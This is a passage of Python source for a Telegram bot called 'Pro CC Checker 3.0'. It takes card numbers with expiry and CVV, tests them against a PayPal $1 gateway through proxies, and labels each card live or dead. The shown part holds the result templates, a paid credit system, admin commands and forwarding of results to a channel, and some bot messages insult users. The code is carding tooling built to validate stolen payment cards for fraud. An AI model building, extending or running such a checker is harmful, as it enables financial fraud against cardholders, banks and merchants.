[↯] 𝗧𝗜𝗠𝗘 ⇾ {elapsed_time:.2f}s

🆔 Checked by: {checked_by}
💰 Credits left: {credits_left}

━━━━━━━━━━━━━━━━
[↯] 𝗕𝘆 ⇾ @xxxxxxxx007xxxxxxxx
"""
        elif 'is3DSecureRequired' in last or 'OTP' in last:
            return f"""
APPROVED ✅
━━━━━━━━━━━━━━━━

[↯] 𝗖𝗰 ⇾ {ccx}
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ PAYPAL 1$
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 → APPROVED 3Ds [OTP] ✅

[↯] 𝗕𝗜𝗡 ⇾ {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
[↯] 𝗕𝗔𝗡𝗞 ⇾ {bin_info['bank']}
[↯] 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⇾ {bin_info['country']} {bin_info['emoji']}

[↯] 𝗧𝗜𝗠𝗘 ⇾ {elapsed_time:.2f}s

🆔 Checked by: {checked_by}
💰 Credits left: {credits_left}

━━━━━━━━━━━━━━━━
[↯] 𝗕𝘆 ⇾ @xxxxxxxx007xxxxxxxx
"""
        elif 'INVALID_SECURITY_CODE' in last:
            return f"""
APPROVED ✅
━━━━━━━━━━━━━━━━

[↯] 𝗖𝗰 ⇾ {ccx}
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ PAYPAL 1$
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 → INVALID CVV --> CCN ✅

[↯] 𝗕𝗜𝗡 ⇾ {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
[↯] 𝗕𝗔𝗡𝗞 ⇾ {bin_info['bank']}
[↯] 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⇾ {bin_info['country']} {bin_info['emoji']}

[↯] 𝗧𝗜𝗠𝗘 ⇾ {elapsed_time:.2f}s

🆔 Checked by: {checked_by}
💰 Credits left: {credits_left}

━━━━━━━━━━━━━━━━
[↯] 𝗕𝘆 ⇾ @xxxxxxxx007xxxxxxxx
"""
        elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
            return f"""
APPROVED ✅
━━━━━━━━━━━━━━━━

[↯] 𝗖𝗰 ⇾ {ccx}
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ PAYPAL 1$
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 → EXISTING_ACCOUNT_RESTRICTED 🌠

[↯] 𝗕𝗜𝗡 ⇾ {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
[↯] 𝗕𝗔𝗡𝗞 ⇾ {bin_info['bank']}
[↯] 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⇾ {bin_info['country']} {bin_info['emoji']}

[↯] 𝗧𝗜𝗠𝗘 ⇾ {elapsed_time:.2f}s

🆔 Checked by: {checked_by}
💰 Credits left: {credits_left}

━━━━━━━━━━━━━━━━
[↯] 𝗕𝘆 ⇾ @xxxxxxxx007xxxxxxxx
"""
        elif 'INVALID_BILLING_ADDRESS' in last:
            return f"""
APPROVED ✅
━━━━━━━━━━━━━━━━

[↯] 𝗖𝗰 ⇾ {ccx}
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ NEW PAYPAL 1$
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 → INVALID_BILLING_ADDRESS ⚡

[↯] 𝗕𝗜𝗡 ⇾ {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
[↯] 𝗕𝗔𝗡𝗞 ⇾ {bin_info['bank']}
[↯] 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⇾ {bin_info['country']} {bin_info['emoji']}

[↯] 𝗧𝗜𝗠𝗘 ⇾ {elapsed_time:.2f}s

🆔 Checked by: {checked_by}
💰 Credits left: {credits_left}

━━━━━━━━━━━━━━━━
[↯] 𝗕𝘆 ⇾ @xxxxxxxx007xxxxxxxx
"""
        else:
            return f"""
DECLINED ❌
━━━━━━━━━━━━━━━━

[↯] 𝗖𝗰 ⇾ {ccx}
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ PAYPAL 1$
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 → DECLINED ❌ {last[:100]}

[↯] 𝗕𝗜𝗡 ⇾ {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
[↯] 𝗕𝗔𝗡𝗞 ⇾ {bin_info['bank']}
[↯] 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⇾ {bin_info['country']} {bin_info['emoji']}

[↯] 𝗧𝗜𝗠𝗘 ⇾ {elapsed_time:.2f}s

🆔 Checked by: {checked_by}
💰 Credits left: {credits_left}

━━━━━━━━━━━━━━━━
[↯] 𝗕𝘆 ⇾ @xxxxxxxx007xxxxxxxx
"""

    except Exception as e:
        logger.error(f"Card check error for {cc_line}: {str(e)}")
        
        # Get BIN info even on error for better user experience
        try:
            n = cc_line.split('|')[0] if '|' in cc_line else cc_line[:16]
            bin_info = await asyncio.wait_for(get_bin_info_async(n[:6]), timeout=3.0)
        except:
            brand = 'VISA' if cc_line.startswith('4') else 'MASTERCARD' if cc_line.startswith('5') else 'UNKNOWN'
            bin_info = {
                'brand': brand,
                'type': 'DEBIT',
                'level': 'CLASSIC', 
                'bank': 'UNKNOWN BANK',
                'country': 'UNITED STATES',
                'emoji': '🇺🇸'
            }
        
        elapsed_time = time.time() - start_time
        checked_by = "@xxxxxxxx007xxxxxxxx"
        credits_left = "∞"
        if user_info:
            checked_by = f"<a href='tg://user?id={user_info['user_id']}'>{user_info['username']}</a>"
            credits_left = "∞" if user_info['user_id'] == ADMIN_ID else str(user_info['credits'])
        
        return f"""
DECLINED ❌
━━━━━━━━━━━━━━━━

[↯] 𝗖𝗰 ⇾ {cc_line}
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ PAYPAL 1$
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 → ERROR: {str(e)[:50]}...

[↯] 𝗕𝗜𝗡 ⇾ {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
[↯] 𝗕𝗔𝗡𝗞 ⇾ {bin_info['bank']}
[↯] 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⇾ {bin_info['country']} {bin_info['emoji']}

[↯] 𝗧𝗜𝗠𝗘 ⇾ {elapsed_time:.2f}s

🆔 Checked by: {checked_by}
💰 Credits left: {credits_left}

━━━━━━━━━━━━━━━━
[↯] 𝗕𝘆 ⇾ @xxxxxxxx007xxxxxxxx
"""

# Start command handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        user_id = user.id
        username = f"@{user.username}" if user.username else "No username"
        join_date = datetime.now().strftime("%d/%m/%Y")

        # Check if user is registered
        db_user = get_user(user_id)
        if not db_user:
            keyboard = [[InlineKeyboardButton("Register", callback_data="register")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            message = (
                "<b>ׂ╰┈➤ Welcome to ⬋</b>\n"
                "<b>ׂPro CC Checker 3.0</b>\n"
                "✎ Register first to use bot features 🔗"
            )
            await update.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML")
        else:
            await show_main_menu(update, context)
    except Exception as e:
        logger.error(f"Start command error: {str(e)}")
        await update.message.reply_text("An error occurred. Please try again later.", parse_mode="HTML")

# Main menu after registration
async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        keyboard = [
            [
                InlineKeyboardButton("Check CC", callback_data="check_cc"),
                InlineKeyboardButton("Credit", callback_data="credit"),
            ],
            [
                InlineKeyboardButton("Info", callback_data="info"),
                InlineKeyboardButton("Owner", callback_data="owner"),
            ],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        message = (
            "<b>ׂ╰┈➤ Welcome to ⬋</b>\n"
            "<b>ׂPro CC Checker 3.0</b>\n"
            ": ̗̀➛ You are already Registered ⭐\n"
            "▬ Use Check CC button to check Cards\n"
            "☁ Use Credit button to check Credits\n"
            "▶ Use Info button to check bot Info\n"
            "✎ Use Owner button to contact Owner"
        )
        if update.callback_query:
            try:
                await update.callback_query.message.edit_text(message, reply_markup=reply_markup, parse_mode="HTML")
            except BadRequest as e:
                if "Message is not modified" in str(e):
                    pass  # Ignore if message content hasn't changed
                else:
                    raise
            except Exception as e:
                # Handle timeout and other errors by sending a new message
                logger.warning(f"Failed to edit message, sending new one: {str(e)}")
                await update.callback_query.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML")
        else:
            await update.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Show main menu error: {str(e)}")
        try:
            # Try to send a simple menu without fancy formatting as fallback
            simple_keyboard = [[InlineKeyboardButton("Check CC", callback_data="check_cc")]]
            simple_reply_markup = InlineKeyboardMarkup(simple_keyboard)
            simple_message = "Welcome to Pro CC Checker 3.0\nUse the button below to start checking."
            
            if update.callback_query and update.callback_query.message:
                await update.callback_query.message.reply_text(simple_message, reply_markup=simple_reply_markup)
            elif update.message:
                await update.message.reply_text(simple_message, reply_markup=simple_reply_markup)
        except Exception as fallback_error:
            logger.error(f"Fallback menu error: {str(fallback_error)}")
            # Last resort - send plain text
            try:
                if update.callback_query and update.callback_query.message:
                    await update.callback_query.message.reply_text("Bot is ready. Use /start to begin.")
                elif update.message:
                    await update.message.reply_text("Bot is ready. Use /start to begin.")
            except:
                pass

# Callback query handler for buttons
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        try:
            await query.answer()
        except BadRequest as e:
            if "Query is too old" in str(e):
                return  # ✅ Ignore silently if expired
            else:
                raise

        user = query.from_user
        user_id = user.id
        db_user = get_user(user_id)

        if not db_user and query.data != "register":
            await query.message.reply_text(
                "Please register first using /start",
                parse_mode="HTML"
            )
            return

        if query.data == "register":
            username = f"@{user.username}" if user.username else "No username"
            join_date = datetime.now().strftime("%d/%m/%Y")
            register_user(user_id, username, join_date)
            try:
                await context.bot.send_message(
                    chat_id=REGISTRATION_CHANNEL,
                    text=f"New User Registered:\nUser ID: {user_id}\nUsername: {username}\nJoin Date: {join_date}\nCredits: 10",
                )
            except Exception as e:
                logger.warning(f"Failed to send registration notification to channel: {str(e)}")
            await show_main_menu(update, context)

        elif query.data == "check_cc":
            context.user_data["state"] = "check_cc"
            keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            message = (
                "<b>ׂ╰┈➤ Welcome to ⬋</b>\n"
                "<b>ׂPro CC Checker 3.0</b>\n"
                ": ̗̀➛ Let's start Checking 💥\n"
                "✎ Use /pp &lt;cc|mm|yy|cvv&gt; to check Single Card\n"
                "✎ Use /mpp &lt;cards&gt; to check Multiple Cards\n"
                "╰┈➤ ex: /pp 4532123456789012|12|25|123"
            )
            try:
                await query.message.edit_text(message, reply_markup=reply_markup, parse_mode="HTML")
            except BadRequest as e:
                if "Message is not modified" in str(e):
                    pass
                else:
                    raise

        elif query.data == "credit":
            credits = "∞" if user_id == ADMIN_ID else db_user[3]
            keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            message = (
                "<b>ׂ╰┈➤ Welcome to ⬋</b>\n"
                "<b>ׂPro CC Checker 3.0</b>\n"
                f": ̗̀➛ Hello <a href='tg://user?id={user_id}'>{user.first_name}</a> 🛸\n"
                f"✎ Credits - 💰 {credits}\n"
                f"╰┈➤ Joined - {db_user[2]}"
            )
            try:
                await query.message.edit_text(message, reply_markup=reply_markup, parse_mode="HTML")
            except BadRequest as e:
                if "Message is not modified" in str(e):
                    pass
                else:
                    raise

        elif query.data == "info":
            keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            message = (
                "<b>ׂ╰┈➤ Welcome to ⬋</b>\n"
                "<b>ׂPro CC Checker 3.0</b>\n"
                ": ̗̀➛ Pro CC Checker Capabilities 🎀\n"
                ": ̗̀➛ Our tool checks CC via PayPal Gateway\n"
                ": ̗̀➛ Accurately detects Live/Dead Cards\n"
                ": ̗̀➛ We use Premium proxies to bypass\n"
                ": ̗̀➛ Hosted on Paid service."
            )
            try:
                await query.message.edit_text(message, reply_markup=reply_markup, parse_mode="HTML")
            except BadRequest as e:
                if "Message is not modified" in str(e):
                    pass
                else:
                    raise

        elif query.data == "owner":
            keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            message = (
                "<b>ׂ╰┈➤ Welcome to ⬋</b>\n"
                "<b>ׂPro CC Checker 3.0</b>\n"
                f": ̗̀➛ Contact Owner: <a href='tg://user?id={ADMIN_ID}'>@xxxxxxxx007xxxxxxxx</a>\n"
                "✎ Click the link above to message the owner directly"
            )
            try:
                await query.message.edit_text(message, reply_markup=reply_markup, parse_mode="HTML")
            except BadRequest as e:
                if "Message is not modified" in str(e):
                    pass
                else:
                    raise

        elif query.data == "back":
            context.user_data["state"] = None
            await show_main_menu(update, context)

    except Exception as e:
        logger.error(f"Button callback error: {str(e)}")
        await query.message.reply_text("An error occurred. Please try again.", parse_mode="HTML")

# Single CC check command handler
async def pp_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    asyncio.create_task(handle_pp_check(update, context))

async def handle_pp_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        user_id = user.id
        db_user = get_user(user_id)

        if not db_user:
            await update.message.reply_text(
                "Register First You MF /start 🤬",
                parse_mode="HTML"
            )
            return

        # Enhanced concurrency control with per-user semaphores
        if user_id not in user_semaphores:
            user_semaphores[user_id] = asyncio.Semaphore(max_concurrent_per_user)

        if context.user_data.get("state") != "check_cc":
            return

        # Check credits FIRST before any processing
        if user_id != ADMIN_ID:
            if db_user[3] <= 0:
                # Styled insufficient credits message with owner contact button
                owner_keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("💬 Contact Owner", url=f"tg://user?id={ADMIN_ID}")]
                ])
                
                insufficient_message = f"""
<b>💳 Insufficient Credits! 💸</b>
━━━━━━━━━━━━━━━━
<b>😔 Oops! You're out of credits</b>
<b>💰 Current Balance:</b> 0 Credits
<b>🎯 Required:</b> 1 Credit minimum

<b>💡 Get more credits:</b>
• Contact the owner below 👇
• Purchase credit packages 💎
• Enjoy premium checking! ⚡
━━━━━━━━━━━━━━━━
                """
                
                await update.message.reply_text(
                    insufficient_message, 
                    reply_markup=owner_keyboard,
                    parse_mode="HTML"
                )
                return

        args = context.args
        if not args or len(args) != 1:
            keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            message = (
                "<b>ׂ╰┈➤ Welcome to ⬋</b>\n"
                "<b>ׂPro CC Checker 3.0</b>\n"
                ": ̗̀➛ Are you retard? 🦢\n"
                "✎ Use /pp &lt;cc|mm|yy|cvv&gt; to check Card\n"
                "╰┈➤ ex: /pp 4532123456789012|12|25|123"
            )
            await update.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML")
            return

        cc_line = args[0]
        
        # Validate CC format
        if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc_line):
            keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            message = (
                "<b>ׂ╰┈➤ Welcome to ⬋</b>\n"
                "<b>ׂPro CC Checker 3.0</b>\n"
                ": ̗̀➛ Invalid CC format! 🦢\n"
                "✎ Use /pp &lt;cc|mm|yy|cvv&gt; to check Card\n"
                "╰┈➤ ex: /pp 4532123456789012|12|25|123"
            )
            await update.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML")
            return

        # Add user to active checks
        active_checks.add(user_id)

        # Optimized processing messages with faster rotation
        processing_messages = [
            "💳 Processing.",
            "💳 Processing..",
            "💳 Processing...",
            "💳 Secure checking 🔒",
            "💳 Validating gateway 🌐",
            "💳 Analyzing data 📊",
            "💳 Checking card ⏳",
            "💳 Connecting PayPal 🔗",
            "💳 Verifying details ✅",
            "💳 Processing 💰"
        ]
        
        processing_msg = await update.message.reply_text(processing_messages[0])
        
        # Start continuous message rotation in background
        message_index = 0
        rotation_active = True
        
        async def rotate_messages():
            nonlocal message_index, rotation_active
            while rotation_active:
                try:
                    await asyncio.sleep(0.8)  # Faster rotation for better UX
                    if rotation_active:
                        message_index = (message_index + 1) % len(processing_messages)
                        await processing_msg.edit_text(processing_messages[message_index])
                except:
                    pass
        
        # Start message rotation task
        rotation_task = asyncio.create_task(rotate_messages())

        try:
            # Check credits BEFORE starting any processing messages
            if user_id != ADMIN_ID:
                update_credits(user_id, db_user[3] - 1)

            # Get user info for check_card function
            user_info = {
                'user_id': user_id,
                'username': user.first_name,
                'credits': db_user[3] - 1 if user_id != ADMIN_ID else float('inf')
            }

            # Use semaphores to control concurrency
            async with global_semaphore:
                async with user_semaphores[user_id]:
                    # Run CC check asynchronously for better performance
                    result = await check_card_async(cc_line, None, user_info)

            # Stop message rotation
            rotation_active = False
            try:
                rotation_task.cancel()
            except:
                pass
            
            try:
                await processing_msg.edit_text(result, parse_mode="HTML")
            except Exception as e:
                if "Message is not modified" in str(e):
                    pass
                else:
                    raise

            try:
                await context.bot.send_message(chat_id=RESULTS_CHANNEL, text=result, parse_mode="HTML")
            except Exception as e:
                logger.warning(f"Failed to send to results channel: {str(e)}")

            keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            message = (
                "<b>ׂ╰┈➤ Welcome to ⬋</b>\n"
                "<b>ׂPro CC Checker 3.0</b>\n"
                ": ̗̀➛ Let's start Checking 💥\n"
                "✎ Use /pp &lt;cc|mm|yy|cvv&gt; to check Single Card\n"
                "✎ Use /mpp &lt;cards&gt; to check Multiple Cards\n"
                "╰┈➤ ex: /pp 4532123456789012|12|25|123"
            )
            await update.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML")

        except Exception as e:
            # Stop message rotation on error
            rotation_active = False
            try:
                rotation_task.cancel()
            except:
                pass
            
            logger.error(f"CC check error: {str(e)}")
            await processing_msg.edit_text("Error: Failed to process the card. Please try again.", parse_mode="HTML")
            keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            message = (
                "<b>ׂ╰┈➤ Welcome to ⬋</b>\n"
                "<b>ׂPro CC Checker 3.0</b>\n"
                ": ̗̀➛ Let's start Checking 💥\n"
                "✎ Use /pp &lt;cc|mm|yy|cvv&gt; to check Single Card\n"
                "✎ Use /mpp &lt;cards&gt; to check Multiple Cards\n"
                "╰┈➤ ex: /pp 4532123456789012|12|25|123"
            )
            await update.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML")
        finally:
            # Remove user from active checks
            active_checks.discard(user_id)

    except Exception as e:
        logger.error(f"Working on some Fault: {str(e)}")
        await update.message.reply_text("An error occurred. Please try again.", parse_mode="HTML")
        active_checks.discard(user_id)
        with stats_lock:
            if user_id in check_stats:
                del check_stats[user_id]

# Admin command to deduct credits
async def deduct_user_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id != ADMIN_ID:
            return

        args = context.args
        if len(args) != 2:
            await update.message.reply_text("Usage: /deductusercredit <user_id> <credits>")
            return

        try:
            user_id = int(args[0])
            credits = int(args[1])
            db_user = get_user(user_id)
            if not db_user:
                await update.message.reply_text("User not found.")
                return
            
            # Check if user has enough credits
            current_credits = db_user[3]
            if current_credits < credits:
                await update.message.reply_text(f"User only has {current_credits} credits. Cannot deduct {credits} credits.")
                return
            
            # Get user info
            try:
                user_info = await context.bot.get_chat(user_id)
                username = f"@{user_info.username}" if user_info.username else user_info.first_name
                display_name = f"<a href='tg://user?id={user_id}'>{user_info.first_name}</a>"
            except:
                username = f"User {user_id}"
                display_name = f"User {user_id}"
            
            # Deduct credits
            new_credits = current_credits - credits
            update_credits(user_id, new_credits)
            current_date = datetime.now().strftime("%d/%m/%Y")
            
            # Message for admin
            admin_message = f"""
<b>Credits Deducted ⚠️</b>
━━━━━━━━━━━━━
<b>🆔 User:</b> {display_name}
<b>💸 Credits Deducted:</b> {credits}
<b>💰 Remaining Credits:</b> {new_credits}
<b>📅 Date:</b> {current_date}
━━━━━━━━━━━━━
            """
            
            # Message for user
            user_message = f"""
<b>Credits Deducted ⚠️</b>
━━━━━━━━━━━━━
<b>💸 Credits Deducted:</b> {credits}
<b>💰 Remaining Credits:</b> {new_credits}
<b>📅 Date:</b> {current_date}
<b>💡 Contact owner for more credits!</b>
━━━━━━━━━━━━━
            """
            
            # Send to admin
            await update.message.reply_text(admin_message, parse_mode="HTML")
            
            # Send to user
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=user_message,
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.warning(f"Failed to send deduction notification to user {user_id}: {str(e)}")
                await update.message.reply_text(f"Credits deducted but failed to notify user: {str(e)}")
                
        except ValueError:
            await update.message.reply_text("Invalid user ID or credits amount.")
    except Exception as e:
        logger.error(f"Deduct credit command error: {str(e)}")
        await update.message.reply_text("An error occurred while deducting credits.", parse_mode="HTML")

# Admin command to add credits
async def add_user_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id != ADMIN_ID:
            return

        args = context.args
        if len(args) != 2:
            await update.message.reply_text("Usage: /addusercredit <user_id> <credits>")
            return

        try:
            user_id = int(args[0])
            credits = int(args[1])
            db_user = get_user(user_id)
            if not db_user:
                await update.message.reply_text("User not found.")
                return
            
            # Get user info
            try:
                user_info = await context.bot.get_chat(user_id)
                username = f"@{user_info.username}" if user_info.username else user_info.first_name
                display_name = f"<a href='tg://user?id={user_id}'>{user_info.first_name}</a>"
            except:
                username = f"User {user_id}"
                display_name = f"User {user_id}"
            
            update_credits(user_id, credits, add=True)
            current_date = datetime.now().strftime("%d/%m/%Y")
            
            # Message for admin
            admin_message = f"""
<b>Credits Added ✅</b>
━━━━━━━━━━━━━
<b>🆔 User:</b> {display_name}
<b>💰 Credits Added:</b> {credits}
<b>📅 Date:</b> {current_date}
━━━━━━━━━━━━━
            """
            
            # Message for user
            user_message = f"""
<b>Credits Added ✅</b>
━━━━━━━━━━━━━
<b>💰 Credits Added:</b> {credits}
<b>📅 Date:</b> {current_date}
<b>🎉 Enjoy your credits!</b>
━━━━━━━━━━━━━
            """
            
            # Send to admin
            await update.message.reply_text(admin_message, parse_mode="HTML")
            
            # Send to user
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=user_message,
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.warning(f"Failed to send credit notification to user {user_id}: {str(e)}")
                await update.message.reply_text(f"Credits added but failed to notify user: {str(e)}")
                
        except ValueError:
            await update.message.reply_text("Invalid user ID or credits amount.")
    except Exception as e:
        logger.error(f"Add credit command error: {str(e)}")
        await update.message.reply_text("An error occurred while adding credits.", parse_mode="HTML")

# Admin command to broadcast message
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id != ADMIN_ID:
            return

        # Get message text after /broadcast command
        message_text = update.message.text
        if not message_text.startswith('/broadcast '):
            await update.message.reply_text("Usage: /broadcast <message>")
            return

        broadcast_message = message_text[11:].strip()  # Remove '/broadcast ' prefix
        
        if not broadcast_message:
            await update.message.reply_text("Please provide a message to broadcast.")
            return

        users = get_all_users()
        if not users:
            await update.message.reply_text("No registered users to broadcast to.")
            return

        success_count = 0
        failed_count = 0
        
        status_msg = await update.message.reply_text(f"Broadcasting to {len(users)} users...")
        
        for user in users:
            try:
                await context.bot.send_message(
                    chat_id=user[0],  # user_id is first column
                    text=broadcast_message,
                    parse_mode="HTML"
                )
                success_count += 1
            except Exception as e:
                logger.warning(f"Failed to send broadcast to user {user[0]}: {str(e)}")
                failed_count += 1
        
        await status_msg.edit_text(
            f"Broadcast completed!\n"
            f"✅ Sent to: {success_count} users\n"
            f"❌ Failed: {failed_count} users"
        )
        
    except Exception as e:
        logger.error(f"Broadcast command error: {str(e)}")
        await update.message.reply_text("An error occurred while broadcasting.", parse_mode="HTML")

# Admin command to list users
async def cc_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id != ADMIN_ID:
            return

        users = get_all_users()
        if not users:
            await update.message.reply_text("No registered users.")
            return

        message = ""
        for i, user in enumerate(users, 1):
            message += (
                f"User - {i}\n"
                f"Username - {user[1]}\n"
                f"ChatID - {user[0]}\n"
                f"Date Joined - {user[2]}\n"
                f"Credits available - {'∞' if user[0] == ADMIN_ID else user[3]}\n\n"
            )
        await update.message.reply_text(message)
    except Exception as e:
        logger.error(f"Users command error: {str(e)}")
        await update.message.reply_text("An error occurred while listing users.", parse_mode="HTML")

# Handle unknown commands or messages
async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        db_user = get_user(user_id)
        
        # If user is actively checking, delete their message and ignore
        if user_id in active_checks:
            try:
                await update.message.delete()
            except:
                pass
            return
        
        # Only show the check CC message if user is registered AND in check_cc state
        if db_user and context.user_data.get("state") == "check_cc":
            keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            message = (
                "<b>ׂ╰┈➤ Welcome to ⬋</b>\n"
                "<b>ׂPro CC Checker 3.0</b>\n"
                ": ̗̀➛ Are you retard? 🦢\n"
                "✎ Use /pp &lt;cc|mm|yy|cvv&gt; to check Card\n"
                "╰┈➤ ex: /pp 4532123456789012|12|25|123"
            )
            await update.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML")
        elif not db_user:
            # For unregistered users, just tell them to register
            await update.message.reply_text("Please use /start to register first.", parse_mode="HTML")
        else:
            # For registered users not in check_cc state, show main menu
            await show_main_menu(update, context)
            
    except Exception as e:
        logger.error(f"Unknown command error: {str(e)}")
        await update.message.reply_text("An error occurred. Please use /start to begin.", parse_mode="HTML")

# Error handler
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")
    if update and update.message:
        await update.message.reply_text("An unexpected error occurred. Please try again later.", parse_mode="HTML")

# Main function to run the bot
def main():
    try:
        init_db()
        application = Application.builder().token(BOT_TOKEN).build()

        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("pp", lambda update, context: asyncio.create_task(pp_check(update, context))))
        # application.add_handler(CommandHandler("mpp", lambda update, context: asyncio.create_task(mpp_check(update, context))))
        application.add_handler(CommandHandler("addusercredit", add_user_credit))
        application.add_handler(CommandHandler("deductusercredit", deduct_user_credit))
        application.add_handler(CommandHandler("broadcast", broadcast))
        application.add_handler(CommandHandler("ccusers", cc_users))
        application.add_handler(CallbackQueryHandler(button_callback))
        # Handle all messages (text, commands, URLs, etc.) when user is checking
        application.add_handler(MessageHandler(filters.ALL & ~filters.UpdateType.EDITED, unknown))
        application.add_error_handler(error_handler)

        # Start polling - synchronous method
        application.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        logger.error(f"Main function error: {str(e)}")
        print("Failed to start the bot. Please check the logs for details.")

if __name__ == "__main__":
    main()
